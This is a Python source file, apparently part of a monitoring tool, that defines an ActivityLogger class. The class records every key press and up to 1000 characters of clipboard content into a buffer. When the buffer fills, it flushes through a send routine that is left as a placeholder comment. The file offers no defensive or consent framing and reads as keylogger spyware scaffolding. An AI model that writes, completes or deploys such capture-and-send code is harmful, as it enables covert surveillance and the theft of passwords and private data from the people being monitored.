# ------------ monitoring/logger.py ------------
from datetime import datetime
import pyperclip
import logging

class ActivityLogger:
    def __init__(self, buffer_limit):
        self.buffer = []
        self.buffer_limit = buffer_limit

    def log_keystroke(self, event):
        if event.event_type == 'down':
            self.buffer.append(event.name)
            if len(self.buffer) >= self.buffer_limit:
                self.flush_buffer()

    def log_clipboard(self):
        try:
            content = pyperclip.paste()[:1000]
            if content:
                self.buffer.append(f"[CLIPBOARD]{content}")
        except Exception as e:
            logging.error(f"Clipboard monitoring error: {str(e)}")

    def flush_buffer(self):
        if self.buffer:
            try:
                # Implementation to send data
                self.buffer.clear()
            except Exception as e:
                logging.error(f"Buffer flush error: {str(e)}")